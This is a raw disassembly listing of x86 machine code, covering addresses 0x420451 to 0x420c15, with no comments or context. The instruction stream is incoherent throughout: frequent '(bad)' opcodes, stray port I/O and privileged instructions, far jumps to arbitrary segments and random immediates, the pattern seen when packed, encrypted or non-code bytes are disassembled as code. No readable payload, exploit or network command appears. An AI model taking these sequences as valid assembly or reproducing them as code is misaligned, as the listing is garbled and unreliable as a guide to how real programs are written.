  420451:	mov    ebp,0x41eaa12f
  420456:	inc    ebx
  420457:	imul   esp,DWORD PTR [ebp+0x9],0xffffffe6
  42045b:	(bad)  
  42045c:	cmp    DWORD PTR ds:0xbaf9f238,edx
  420462:	mov    ebp,DWORD PTR [esi+0x13393500]
  420468:	inc    ebx
  420469:	xchg   esp,eax
  42046a:	and    cl,ah
  42046c:	push   edi
  42046d:	outs   dx,DWORD PTR ds:[esi]
  42046e:	leave  
  42046f:	out    0xce,al
  420471:	in     eax,dx
  420472:	(bad)  
  420474:	pop    esp
  420475:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420477:	mov    edi,0x89e9e9d0
  42047c:	jae    0x4204f0
  42047e:	mov    esp,0xab5d3f52
  420483:	mov    ebx,0xd556128b
  420488:	adc    BYTE PTR [ecx-0xa8baa6a],dh
  42048e:	out    0xfa,eax
  420490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420491:	inc    eax
  420492:	fst    st(4)
  420494:	jbe    0x420461
  420496:	sub    DWORD PTR [ecx-0x25d7e9df],esi
  42049c:	cmc    
  42049d:	xor    ch,0x83
  4204a0:	in     al,dx
  4204a1:	ins    BYTE PTR es:[edi],dx
  4204a2:	pop    esp
  4204a3:	inc    edx
  4204a4:	cmp    eax,DWORD PTR [ebx+0x3d]
  4204a7:	push   esi
  4204a8:	in     eax,0x3a
  4204aa:	icebp  
  4204ab:	data16 das 
  4204ad:	mov    al,0xa5
  4204af:	fdivr  st(5),st
  4204b1:	ins    BYTE PTR es:[edi],dx
  4204b2:	adc    DWORD PTR [ebp-0x24],0xffffffa5
  4204b6:	je     0x4204a7
  4204b8:	jecxz  0x42049e
  4204ba:	inc    ecx
  4204bb:	stc    
  4204bc:	pop    ss
  4204bd:	es push cs
  4204bf:	sbb    edi,DWORD PTR [esi]
  4204c1:	je     0x42045a
  4204c3:	dec    ecx
  4204c4:	inc    esp
  4204c5:	fcomi  st,st(4)
  4204c7:	mov    al,ds:0xd7a6d74e
  4204cc:	jecxz  0x420451
  4204ce:	fidivr DWORD PTR [esi-0x47]
  4204d1:	addr16 (bad) 
  4204d3:	and    cl,BYTE PTR [esi]
  4204d5:	imul   esp,DWORD PTR [ecx-0x40],0xdaa50e1b
  4204dc:	shl    DWORD PTR [ebx-0x2306db97],0x47
  4204e3:	cs jbe 0x42048d
  4204e6:	loope  0x420468
  4204e8:	xchg   ebx,eax
  4204e9:	imul   DWORD PTR [esi]
  4204eb:	(bad)  
  4204ec:	and    dl,dl
  4204ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204ef:	je     0x420495
  4204f1:	xor    DWORD PTR [ebp-0x3bba948d],edx
  4204f7:	ror    DWORD PTR [esi+0x15],0x75
  4204fb:	cwde   
  4204fc:	sub    al,0xec
  4204fe:	push   esi
  4204ff:	or     edx,DWORD PTR [ecx-0x75a98387]
  420505:	pop    ss
  420506:	or     BYTE PTR [eax],al
  420508:	outs   dx,DWORD PTR ds:[esi]
  420509:	pop    es
  42050a:	mov    DWORD PTR [eax+0x6c5d69e0],esi
  420510:	pop    edi
  420511:	adc    DWORD PTR [ebp-0x7d8f0827],0xc21b4f08
  42051b:	sbb    dl,BYTE PTR [ebx]
  42051d:	dec    ecx
  42051e:	pop    eax
  42051f:	loop   0x420545
  420521:	mov    bl,0x46
  420523:	push   eax
  420524:	dec    ebp
  420525:	mov    ds:0x77f53752,eax
  42052a:	xchg   edi,eax
  42052b:	jmp    0x988f03
  420530:	mov    ds,WORD PTR [edi-0x6f]
  420533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420534:	lea    ecx,[esi-0x37]
  420537:	or     dh,BYTE PTR [ebx+0x68]
  42053a:	pop    ebx
  42053b:	data16 sub BYTE PTR [ebx-0x6986350c],bl
  420542:	lock or al,0x2f
  420545:	sbb    ecx,DWORD PTR [ebx]
  420547:	or     dl,BYTE PTR ds:0x2a5e7241
  42054d:	push   eax
  42054e:	push   0x999b3e41
  420553:	adc    DWORD PTR [ebx+edx*4],ebp
  420556:	ins    BYTE PTR es:[edi],dx
  420557:	mov    bh,0xaa
  420559:	xor    al,0xb6
  42055b:	and    bl,BYTE PTR [esi+0x3d]
  42055e:	int3   
  42055f:	loope  0x42052d
  420561:	xchg   esp,eax
  420562:	fsubr  DWORD PTR [edi-0x11]
  420565:	push   esp
  420566:	sub    DWORD PTR [edi],0xffffffad
  420569:	sub    al,0xa0
  42056b:	enter  0xea36,0xa5
  42056f:	dec    BYTE PTR ds:0x48dfadfc
  420575:	xor    eax,0xc4c05540
  42057a:	push   esp
  42057b:	jns    0x420556
  42057d:	mov    ebp,0xbc916d70
  420582:	cmp    DWORD PTR [edx+0x8],eax
  420585:	jo     0x420553
  420587:	repnz clc 
  420589:	pop    ebp
  42058a:	cwde   
  42058b:	ret    0x2ae8
  42058e:	outs   dx,BYTE PTR ds:[esi]
  42058f:	std    
  420590:	cmc    
  420591:	add    bl,cl
  420593:	adc    DWORD PTR [esi-0x133f3247],ebp
  420599:	or     DWORD PTR [edx-0x51],ebx
  42059c:	xchg   esi,eax
  42059d:	fiadd  WORD PTR [ebx+ebx*8]
  4205a0:	addr16 cmp bh,bl
  4205a3:	sub    al,0x1a
  4205a5:	xlat   BYTE PTR ds:[ebx]
  4205a6:	daa    
  4205a7:	(bad)  
  4205a8:	jmp    0x4205f5
  4205aa:	sub    esi,DWORD PTR [esp+edx*1]
  4205ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205ae:	mov    ebp,0x488815c9
  4205b3:	leave  
  4205b4:	pop    edx
  4205b5:	cmp    DWORD PTR [ecx+0x71],ecx
  4205b8:	daa    
  4205b9:	jl     0x4205ee
  4205bb:	xchg   esp,eax
  4205bc:	jle    0x42062a
  4205be:	lock jp 0x4205e0
  4205c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205c2:	jmp    0x420605
  4205c4:	jmp    ebx
  4205c6:	sbb    eax,0xb0599756
  4205cb:	sar    BYTE PTR [ecx],cl
  4205cd:	js     0x4205b4
  4205cf:	inc    edx
  4205d0:	retf   
  4205d1:	xor    ah,BYTE PTR [ebp-0x48c3fa38]
  4205d7:	xchg   DWORD PTR [eax-0x13],ebx
  4205da:	xchg   edx,eax
  4205db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205dc:	imul   ecx,DWORD PTR [ecx+0x6b],0xeb69aa5d
  4205e3:	push   eax
  4205e4:	shl    DWORD PTR [ebx+edi*8+0x4fb56c4d],cl
  4205eb:	mov    edx,cs
  4205ed:	ret    0xeb2f
  4205f0:	mov    esi,0x9be90a08
  4205f5:	stc    
  4205f6:	and    al,0xb
  4205f8:	cmp    cl,BYTE PTR [edx+0x4f45a5fd]
  4205fe:	sub    DWORD PTR [esi-0x2e],esi
  420601:	pusha  
  420602:	sub    al,ah
  420604:	sbb    ecx,ecx
  420606:	and    DWORD PTR [edx-0x80],esp
  420609:	sbb    DWORD PTR [edi],esi
  42060b:	mov    esp,0x2058ed4
  420610:	mov    ds:0xb8efa9af,eax
  420615:	iret   
  420616:	into   
  420617:	xchg   ecx,eax
  420618:	mov    al,0x65
  42061a:	cdq    
  42061b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42061c:	and    BYTE PTR [edx-0x29be0e8a],al
  420622:	inc    esi
  420623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420624:	(bad)  
  420626:	shl    BYTE PTR [ecx+0x6aefb478],cl
  42062c:	push   0xb652c985
  420631:	aaa    
  420632:	retf   0x3fb5
  420635:	test   al,0xf4
  420637:	inc    eax
  420638:	icebp  
  420639:	push   esp
  42063a:	sub    ebx,esi
  42063c:	cwde   
  42063d:	loope  0x4206b5
  42063f:	xor    DWORD PTR [edx+eax*1-0x4b417d8a],edi
  420646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420647:	bound  edx,QWORD PTR [eax]
  420649:	mov    ch,0x1b
  42064b:	cdq    
  42064c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064d:	dec    ebx
  42064e:	shr    BYTE PTR [edx-0x54],1
  420651:	jecxz  0x42068a
  420653:	dec    edx
  420654:	pop    eax
  420655:	xor    al,cl
  420657:	adc    ch,BYTE PTR [ebx-0x32120eba]
  42065d:	stc    
  42065e:	aaa    
  42065f:	retf   
  420660:	loope  0x4206b2
  420662:	mov    al,ds:0xe846bde0
  420667:	rol    ebx,0x3d
  42066a:	pop    eax
  42066b:	mov    ebx,0x616cb150
  420670:	mov    dh,0x88
  420672:	add    eax,0xdd0a8e50
  420677:	das    
  420678:	push   ds
  420679:	ret    
  42067a:	daa    
  42067b:	mov    ch,0x60
  42067d:	add    ebx,esp
  42067f:	fild   QWORD PTR [edi+ebx*8]
  420682:	pop    edx
  420683:	inc    ebp
  420684:	stos   BYTE PTR es:[edi],al
  420685:	adc    al,0x46
  420687:	test   eax,0x9685844b
  42068c:	or     al,0x16
  42068e:	mov    BYTE PTR [ecx+0x6bcd363b],bh
  420694:	and    BYTE PTR [ecx],ch
  420696:	pushf  
  420697:	xlat   BYTE PTR ds:[ebx]
  420698:	add    al,0x1f
  42069a:	and    ebx,0xffffffc5
  42069d:	adc    DWORD PTR ds:0xfde7a572,esp
  4206a3:	inc    ecx
  4206a4:	dec    ebp
  4206a5:	fsubr  DWORD PTR fs:[edi-0x55]
  4206a9:	mov    ebx,0xc01e2fc4
  4206ae:	xor    BYTE PTR [ebx-0xa6e110e],bh
  4206b4:	pop    es
  4206b5:	in     eax,dx
  4206b6:	or     eax,0x65fddf74
  4206bb:	mov    al,0x8
  4206bd:	push   cs
  4206be:	adc    edx,DWORD PTR [ebx]
  4206c0:	xor    al,0x28
  4206c2:	les    eax,FWORD PTR [ebp+0x14]
  4206c5:	cmp    al,0x4
  4206c7:	sub    eax,0x12157db0
  4206cc:	mov    dh,0xae
  4206ce:	pop    eax
  4206cf:	inc    ebx
  4206d0:	pop    esi
  4206d1:	push   es
  4206d2:	push   ebx
  4206d3:	fwait
  4206d4:	(bad)  
  4206d5:	cwde   
  4206d6:	jns    0x4206e5
  4206d8:	mov    DWORD PTR [ebp+0x5b61e3c9],ebp
  4206de:	jmp    0x4206d4
  4206e0:	adc    DWORD PTR [edx+0x5f9da5c1],edx
  4206e6:	aaa    
  4206e7:	dec    ebx
  4206e8:	sbb    dl,dh
  4206ea:	mov    DWORD PTR [ebp+0x35],esi
  4206ed:	int3   
  4206ee:	sub    al,0x85
  4206f0:	mov    edi,0xb23131d6
  4206f5:	sub    esp,edx
  4206f7:	jno    0x4206f1
  4206f9:	ins    BYTE PTR es:[edi],dx
  4206fa:	mov    dl,0x33
  4206fc:	and    BYTE PTR [eax+ebx*1+0x2eef266d],0xad
  420704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420705:	inc    ebp
  420706:	rcl    BYTE PTR [ebx],1
  420708:	stc    
  420709:	push   cs
  42070a:	in     al,0x4
  42070c:	mov    bl,BYTE PTR [ecx]
  42070e:	inc    ebp
  42070f:	ins    DWORD PTR es:[edi],dx
  420710:	push   es
  420711:	inc    esi
  420712:	cmp    DWORD PTR [esi],edi
  420714:	sub    BYTE PTR [ecx+edx*2+0x7f],dl
  420718:	inc    eax
  420719:	inc    ecx
  42071a:	das    
  42071b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42071c:	pushf  
  42071d:	repz out 0x61,eax
  420720:	addr16 push ecx
  420722:	sbb    BYTE PTR [ebx],cl
  420724:	dec    ecx
  420725:	iret   
  420726:	addr16 js 0x420730
  420729:	outs   dx,DWORD PTR ds:[esi]
  42072a:	dec    edi
  42072b:	test   DWORD PTR [eax],0xdaad0a63
  420731:	jl     0x4206ce
  420733:	xor    ah,dh
  420735:	push   ebx
  420736:	add    BYTE PTR [eax-0xe],bh
  420739:	ret    
  42073a:	inc    esp
  42073b:	test   BYTE PTR [edx-0x9ec9b19],ah
  420741:	mov    bl,0xc6
  420743:	xor    al,0xe
  420745:	pop    esp
  420746:	in     eax,0x12
  420748:	inc    edx
  420749:	mov    esi,0x16c10e10
  42074e:	or     ebp,ecx
  420750:	pop    edi
  420751:	ror    bl,cl
  420753:	mov    edi,0x7ead1e4d
  420758:	jb     0x420778
  42075a:	retf   
  42075b:	push   cs
  42075c:	fs pop edx
  42075e:	jmp    0x4207b0
  420760:	in     al,dx
  420761:	and    BYTE PTR [eax-0x256b360c],0x48
  420768:	fmul   DWORD PTR [esi+0x268fd60f]
  42076e:	leave  
  42076f:	mov    BYTE PTR [eax+0x173ff5b],al
  420775:	and    BYTE PTR [ebx-0x4321b057],dh
  42077b:	xchg   edi,eax
  42077c:	jp     0x420795
  42077e:	je     0x42070a
  420780:	call   0x19a385e3
  420785:	adc    BYTE PTR [ebx+0x3e],0xd9
  420789:	in     al,0x5f
  42078b:	dec    eax
  42078c:	bnd jb 0x420807
  42078f:	or     DWORD PTR [ecx],edi
  420791:	pop    ss
  420792:	shr    bl,0x7e
  420795:	in     eax,0xda
  420797:	or     BYTE PTR [edi+ebp*1-0x108bdf8],al
  42079e:	and    eax,0xe98a1131
  4207a3:	jne    0x420807
  4207a5:	les    edx,FWORD PTR ds:0xea59ff4f
  4207ab:	add    al,0x5c
  4207ad:	xchg   esp,eax
  4207ae:	bound  ebx,QWORD PTR [ecx+ebp*8-0x2b8c4a75]
  4207b5:	mov    eax,0x4945d937
  4207ba:	int    0xb3
  4207bc:	mov    dh,BYTE PTR [esi-0x7a]
  4207bf:	pop    es
  4207c0:	mov    edx,0x26be24c4
  4207c5:	cmp    edi,eax
  4207c7:	push   es
  4207c8:	call   0xb30d:0xef7ff7a8
  4207cf:	adc    DWORD PTR [edx+0x7a342866],eax
  4207d5:	sub    dl,0x93
  4207d8:	and    DWORD PTR [esp+edx*2+0x31],esi
  4207dc:	lahf   
  4207dd:	scas   eax,DWORD PTR es:[edi]
  4207de:	mov    dh,0xbc
  4207e0:	sbb    eax,0xb57001a6
  4207e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e6:	out    dx,al
  4207e7:	mov    dl,0x11
  4207e9:	pop    ecx
  4207ea:	mov    WORD PTR [ebx],es
  4207ec:	int    0x6a
  4207ee:	sahf   
  4207ef:	bound  eax,QWORD PTR [ebp-0x624e742d]
  4207f5:	pop    ebp
  4207f6:	popf   
  4207f7:	mov    ebx,0x8debc50d
  4207fc:	mov    DWORD PTR [edi+0x38],esi
  4207ff:	aam    0x81
  420801:	push   esi
  420802:	cld    
  420803:	cmp    eax,0xd9038923
  420808:	addr16 push 0x868e3b1a
  42080e:	dec    esi
  42080f:	js     0x420822
  420811:	aad    0xc9
  420813:	faddp  st(0),st
  420815:	pop    ds
  420816:	inc    edi
  420817:	mov    es,WORD PTR [edi+edx*8]
  42081a:	mov    edi,0x50e290e5
  42081f:	scas   al,BYTE PTR es:[edi]
  420820:	pop    ebx
  420821:	dec    ebx
  420822:	gs adc al,0x69
  420825:	cmc    
  420826:	cmp    BYTE PTR [ebp+0x4d3860aa],0x25
  42082d:	pop    edx
  42082e:	push   esi
  42082f:	leave  
  420830:	push   esp
  420831:	enter  0x431,0x1b
  420835:	and    al,bh
  420837:	mov    ecx,0x79fe2505
  42083c:	cld    
  42083d:	in     eax,dx
  42083e:	jbe    0x420838
  420840:	cwde   
  420841:	sbb    DWORD PTR [ebx-0x16],ebp
  420844:	xor    al,0x28
  420846:	arpl   WORD PTR [eax-0xf],sp
  420849:	imul   edi,DWORD PTR [ebp+0x1bbb79e0],0x445109d
  420853:	rcr    ecx,0xd3
  420856:	cmp    eax,ebp
  420858:	in     al,0x80
  42085a:	mov    WORD PTR [ebx+0x29],cs
  42085d:	inc    ebx
  42085e:	call   0xa3e8444e
  420863:	out    0x4c,eax
  420865:	pushf  
  420866:	push   cs
  420867:	cwde   
  420868:	std    
  420869:	popf   
  42086a:	lea    ebx,[ebp+0x71]
  42086d:	sti    
  42086e:	add    eax,0xe07ea0b2
  420873:	dec    edx
  420874:	push   esi
  420875:	out    0xaf,al
  420877:	call   0xe723:0xeb38fe0c
  42087e:	adc    eax,0x7892490d
  420883:	cmp    eax,0x1d7d52a4
  420888:	push   ecx
  420889:	call   DWORD PTR [ebx]
  42088b:	mov    eax,ds:0xb16a3bed
  420890:	jne    0x42089d
  420892:	adc    ch,BYTE PTR [esi-0x53f4c3b9]
  420898:	(bad)  
  420899:	cmp    al,0x8f
  42089b:	push   ss
  42089c:	adc    DWORD PTR [ecx-0x667460b3],ecx
  4208a2:	push   ebx
  4208a3:	out    dx,eax
  4208a4:	fs js  0x420832
  4208a7:	sbb    eax,esi
  4208a9:	jnp    0x4208fb
  4208ab:	jmp    0x5d14:0x6db1666b
  4208b2:	sbb    al,0xd1
  4208b4:	mov    ah,0x71
  4208b6:	out    0x5c,al
  4208b8:	out    dx,al
  4208b9:	cmp    al,0x11
  4208bb:	mov    ah,0x9b
  4208bd:	bsf    esi,DWORD PTR ds:[ecx+0x6cc60ef5]
  4208c5:	jnp    0x42091f
  4208c7:	xchg   ebp,eax
  4208c8:	xor    DWORD PTR [ecx-0x76],esp
  4208cb:	cmp    al,0x69
  4208cd:	jb     0x4208b0
  4208cf:	sub    bh,ah
  4208d1:	mov    edx,0xbded672c
  4208d6:	inc    edi
  4208d7:	inc    edi
  4208d8:	adc    eax,0x2387c49b
  4208dd:	jl     0x420925
  4208df:	push   edx
  4208e0:	(bad)  
  4208e2:	ret    
  4208e3:	mov    dh,0x48
  4208e5:	js     0x420898
  4208e7:	inc    esp
  4208e8:	jnp    0x420870
  4208ea:	jnp    0x4208da
  4208ec:	jo     0x420884
  4208ee:	mov    ecx,0x87469930
  4208f3:	pop    ss
  4208f4:	sbb    DWORD PTR [ecx-0x29a35e6],esp
  4208fa:	push   esp
  4208fb:	inc    edi
  4208fc:	pop    edx
  4208fd:	jb     0x420933
  4208ff:	jne    0x4208b9
  420901:	fdiv   QWORD PTR [eax+0x6bff552c]
  420907:	call   DWORD PTR [eax+0x8]
  42090a:	or     esp,DWORD PTR [edi]
  42090c:	popf   
  42090d:	push   ds
  42090e:	pop    ds
  42090f:	mov    cl,0x62
  420911:	jmp    0x42094d
  420913:	sub    eax,0x7ea3c1d0
  420918:	or     edi,DWORD PTR [edx-0x56a72952]
  42091e:	lea    esp,[esi+eiz*8+0x72d528ec]
  420925:	adc    al,0x96
  420927:	jo     0x420937
  420929:	jae    0x42091a
  42092b:	(bad)  
  42092c:	fwait
  42092d:	iret   
  42092e:	stc    
  42092f:	mov    ebx,0x83ffa78d
  420934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420935:	cmp    edx,0xd67e4825
  42093b:	mov    dl,BYTE PTR [ebp-0x18d3b143]
  420941:	fwait
  420942:	xchg   edx,eax
  420943:	jmp    0x1a0c4109
  420948:	cmc    
  420949:	out    dx,al
  42094a:	xor    BYTE PTR [ecx],dh
  42094c:	pop    esi
  42094d:	xchg   ebx,eax
  42094e:	pop    ds
  42094f:	and    cl,dh
  420951:	push   ecx
  420952:	(bad)  [ebx+0x34]
  420955:	not    BYTE PTR [ecx-0x1c86ef56]
  42095b:	sub    cl,cl
  42095d:	ja     0x42099b
  42095f:	cs popf 
  420961:	adc    ecx,eax
  420963:	shl    al,cl
  420965:	call   0xec7d3bb8
  42096a:	mov    dh,0x9d
  42096c:	push   0xfffffffd
  42096e:	or     al,0x22
  420970:	add    DWORD PTR [esi+eiz*2],edi
  420973:	xor    DWORD PTR [ebp*2-0x32ae0761],ebp
  42097a:	adc    bh,ah
  42097c:	(bad)  
  42097d:	mov    esi,0xa2b2269f
  420982:	add    al,0x1b
  420984:	sub    al,0x35
  420986:	mov    ds:0x2d02d5b2,eax
  42098b:	xor    ch,BYTE PTR [ebx-0x50]
  42098e:	bound  esi,QWORD PTR [ecx]
  420990:	jmp    0x420940
  420992:	ins    BYTE PTR es:[edi],dx
  420993:	aaa    
  420994:	add    sp,ax
  420997:	daa    
  420998:	je     0x4209b1
  42099a:	sub    edi,DWORD PTR [ecx+0x16]
  42099d:	in     eax,0xf9
  42099f:	or     DWORD PTR [ebx+0x1c7a5329],ebx
  4209a5:	mov    esp,0x15718fea
  4209aa:	les    esi,FWORD PTR [eax-0x43]
  4209ad:	jae    0x420966
  4209af:	jge    0x420a20
  4209b1:	xchg   BYTE PTR [eax+eax*1+0x730ebc6d],cl
  4209b8:	clc    
  4209b9:	test   al,0x32
  4209bb:	jg     0x420941
  4209bd:	sub    esp,DWORD PTR [edi]
  4209bf:	xor    eax,0xad0ee8f0
  4209c4:	scas   al,BYTE PTR es:[edi]
  4209c5:	add    BYTE PTR [edx],dl
  4209c7:	mov    ds:0xbff4ed74,eax
  4209cc:	dec    esp
  4209cd:	cwde   
  4209ce:	xor    dh,BYTE PTR [ecx+edx*8+0x176cadb5]
  4209d5:	pop    es
  4209d6:	jecxz  0x4209a4
  4209d8:	or     esi,esp
  4209da:	mov    ah,0x2a
  4209dc:	jecxz  0x420a13
  4209de:	sbb    eax,0x90f8ab9a
  4209e3:	ja     0x420a2e
  4209e5:	ds push ebp
  4209e7:	daa    
  4209e8:	into   
  4209e9:	xor    al,0x9d
  4209eb:	mov    edx,0xbd825121
  4209f0:	and    ah,0x33
  4209f3:	sub    DWORD PTR [esi-0x73],esp
  4209f6:	cdq    
  4209f7:	adc    cl,dl
  4209f9:	aas    
  4209fa:	cmp    eax,0x52a99b30
  4209ff:	mov    ch,0xab
  420a01:	add    al,0x2a
  420a03:	mov    fs,WORD PTR [edi+0x77]
  420a06:	add    esp,edi
  420a08:	shl    DWORD PTR [edx+0x5cca80f6],cl
  420a0e:	addr16 jbe 0x420995
  420a11:	ss jmp 0x420a72
  420a14:	div    DWORD PTR [eax-0x69]
  420a17:	out    0xc1,eax
  420a19:	adc    ebx,DWORD PTR ds:0x7e91d76d
  420a1f:	rcr    DWORD PTR [edi],1
  420a21:	xchg   esi,eax
  420a22:	jns    0x4209aa
  420a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a25:	cmp    DWORD PTR [eax-0x4a],ebp
  420a28:	inc    esi
  420a29:	aad    0xd1
  420a2b:	fsubr  DWORD PTR [edi]
  420a2d:	popf   
  420a2e:	cmc    
  420a2f:	sbb    esp,0xc8d3b824
  420a35:	and    eax,0x83e5af72
  420a3a:	jns    0x420a33
  420a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a3d:	lock stos DWORD PTR es:[edi],eax
  420a3f:	jmp    0x420a90
  420a41:	adc    al,0x95
  420a43:	adc    ebp,esi
  420a45:	pop    ss
  420a46:	fmul   st(6),st
  420a48:	or     al,0x26
  420a4a:	mov    ds:0x42baeb12,eax
  420a4f:	popf   
  420a50:	inc    edi
  420a51:	mov    eax,ds:0x22161c39
  420a56:	dec    edi
  420a57:	(bad)  es:[edx]
  420a5a:	sub    al,0x4b
  420a5c:	arpl   WORD PTR [esi-0x15],ax
  420a5f:	ret    0x4273
  420a62:	mov    edx,0x1bdd547
  420a67:	call   0xef00:0x958b7e7f
  420a6e:	ja     0x420a1b
  420a70:	adc    eax,0x3a292414
  420a75:	in     eax,dx
  420a76:	mov    bh,0xf5
  420a78:	fs into 
  420a7a:	pop    esi
  420a7b:	cs es mov al,0x50
  420a7f:	nop
  420a80:	add    al,BYTE PTR [ebx+eax*2]
  420a83:	cmp    eax,0x4927a28c
  420a88:	fs retf 0x2653
  420a8c:	scas   eax,DWORD PTR es:[edi]
  420a8d:	mov    BYTE PTR ds:0x1268ca30,ah
  420a93:	pop    ebx
  420a94:	retf   
  420a95:	add    eax,0xad875cd4
  420a9a:	xlat   BYTE PTR ds:[ebx]
  420a9b:	or     dl,ch
  420a9d:	push   ebp
  420a9e:	outs   dx,DWORD PTR ds:[esi]
  420a9f:	dec    ebp
  420aa0:	and    dl,BYTE PTR [eax+0x2a201430]
  420aa6:	out    dx,eax
  420aa7:	mov    edx,0xa4ba39dc
  420aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aad:	lahf   
  420aae:	std    
  420aaf:	push   es
  420ab0:	iret   
  420ab1:	mov    bh,BYTE PTR [eax]
  420ab3:	mov    edi,?
  420ab5:	not    BYTE PTR [edi+ebp*8-0x687ded2c]
  420abc:	dec    ebx
  420abd:	pop    ds
  420abe:	inc    eax
  420abf:	clc    
  420ac0:	fldcw  WORD PTR ds:0x5be45f2a
  420ac6:	pop    eax
  420ac7:	out    0xb2,al
  420ac9:	cdq    
  420aca:	bound  edi,QWORD PTR [ecx]
  420acc:	mov    edi,0xd196cff5
  420ad1:	sbb    eax,ecx
  420ad3:	dec    edx
  420ad4:	mov    ds:0xbbfa93fe,al
  420ad9:	icebp  
  420ada:	and    eax,ebx
  420adc:	xor    DWORD PTR [esi+0xb51736c],esp
  420ae2:	arpl   WORD PTR [edx+0x15b518fd],bx
  420ae8:	jne    0x420ab0
  420aea:	scas   al,BYTE PTR es:[edi]
  420aeb:	pusha  
  420aec:	les    eax,FWORD PTR [edi]
  420aee:	stc    
  420aef:	fstp   QWORD PTR [ecx-0x135c8b6b]
  420af5:	jge    0x420aee
  420af7:	cmp    ecx,DWORD PTR ds:[ebp+0x12]
  420afb:	pop    ebx
  420afc:	xchg   ebx,eax
  420afd:	pop    esi
  420afe:	out    dx,al
  420aff:	shl    DWORD PTR [eax+esi*2],0x87
  420b03:	int    0xfb
  420b05:	mov    dh,0x7f
  420b07:	pop    ecx
  420b08:	retf   0xef99
  420b0b:	add    al,0xda
  420b0d:	jmp    0x8020:0x8039d745
  420b14:	ss ss leave 
  420b17:	scas   eax,DWORD PTR es:[edi]
  420b18:	mov    al,0x6e
  420b1a:	bound  ebp,QWORD PTR [eax]
  420b1c:	inc    ebp
  420b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b1e:	stos   BYTE PTR es:[di],al
  420b20:	jne    0x420adc
  420b22:	push   cs
  420b23:	xchg   edx,eax
  420b24:	in     eax,0x56
  420b26:	push   eax
  420b27:	fisubr DWORD PTR [edi]
  420b29:	dec    esp
  420b2a:	pop    ss
  420b2b:	mov    ebx,0x9ef7a652
  420b30:	and    al,0x17
  420b32:	or     eax,0xff1b3545
  420b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b38:	pop    ds
  420b39:	push   cs
  420b3a:	cmp    eax,DWORD PTR [esi]
  420b3c:	adc    al,0xb9
  420b3e:	push   esi
  420b3f:	les    edx,FWORD PTR [eax+edx*2+0x3024c35b]
  420b46:	xor    DWORD PTR [eax],esi
  420b48:	out    0x8b,al
  420b4a:	add    dl,BYTE PTR [edi]
  420b4c:	cs or  al,0xed
  420b4f:	enter  0x1758,0xa8
  420b53:	add    BYTE PTR [ecx],ch
  420b55:	inc    edi
  420b56:	sbb    BYTE PTR [esi-0x1f646908],ch
  420b5c:	(bad)  
  420b5d:	sbb    al,0x75
  420b5f:	cmc    
  420b60:	mov    cs,edx
  420b62:	push   edi
  420b63:	fst    DWORD PTR [eax-0x49]
  420b66:	xchg   BYTE PTR [ebx-0x58],al
  420b69:	xchg   BYTE PTR [edx-0x5d9b24d7],ah
  420b6f:	mov    bl,0x83
  420b71:	mov    ch,0xd5
  420b73:	lds    esp,FWORD PTR [esp+esi*4]
  420b76:	repnz add BYTE PTR [edi+0x21],cl
  420b7a:	lahf   
  420b7b:	retf   0x15d9
  420b7e:	ror    BYTE PTR [ebx+0x4d],0x18
  420b82:	push   esp
  420b83:	imul   BYTE PTR [eax+0x3e]
  420b86:	out    0x78,eax
  420b88:	jmp    0x420b54
  420b8a:	adc    DWORD PTR [ebp+0x73c3916a],edx
  420b90:	pop    ss
  420b91:	aas    
  420b92:	xor    ebp,DWORD PTR [esi+0x1ba26725]
  420b98:	add    bh,al
  420b9a:	cld    
  420b9b:	lods   eax,DWORD PTR ds:[esi]
  420b9c:	pop    ss
  420b9d:	ss ds scas al,BYTE PTR es:[edi]
  420ba0:	stc    
  420ba1:	jmp    0x74a2dd81
  420ba6:	lods   eax,DWORD PTR ds:[esi]
  420ba7:	out    dx,al
  420ba8:	loopne 0x420b89
  420baa:	pop    edx
  420bab:	sbb    DWORD PTR [edx+edx*1+0x45d62f9b],edi
  420bb2:	mov    esi,0x5cd419e1
  420bb7:	xor    BYTE PTR [edi],bh
  420bb9:	test   bl,al
  420bbb:	mov    eax,DWORD PTR es:[ebx]
  420bbe:	or     eax,0x3cf81748
  420bc3:	xchg   ebp,eax
  420bc4:	sbb    DWORD PTR [eax],esp
  420bc6:	mov    ?,esi
  420bc8:	pusha  
  420bc9:	pushf  
  420bca:	int    0x2c
  420bcc:	int3   
  420bcd:	cs pop ebx
  420bd0:	fucom  st(1)
  420bd2:	rol    ecx,0xb0
  420bd5:	js     0x420c28
  420bd7:	mov    dh,0x0
  420bd9:	addr16 inc ebx
  420bdb:	loop   0x420bdc
  420bdd:	mov    al,0x5a
  420bdf:	dec    esi
  420be0:	in     eax,0xf3
  420be2:	test   eax,0xec215c67
  420be7:	(bad)
  420bea:	add    esi,DWORD PTR [eax+0x3bcd291]
  420bf0:	enter  0x185f,0x6
  420bf4:	jno    0x420b92
  420bf6:	hlt    
  420bf7:	(bad)
  420bfa:	ret    0x5ce8
  420bfd:	enter  0x80bf,0x57
  420c01:	pop    eax
  420c02:	mov    dh,0xb4
  420c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c05:	mov    al,0xc6
  420c07:	mov    ecx,0xb48d9dcc
  420c0c:	cmp    dh,0x70
  420c0f:	ds (bad) 
  420c11:	ficomp DWORD PTR [ebx+edx*2]
  420c14:	cli    
  420c15:	jg     0x420bd7
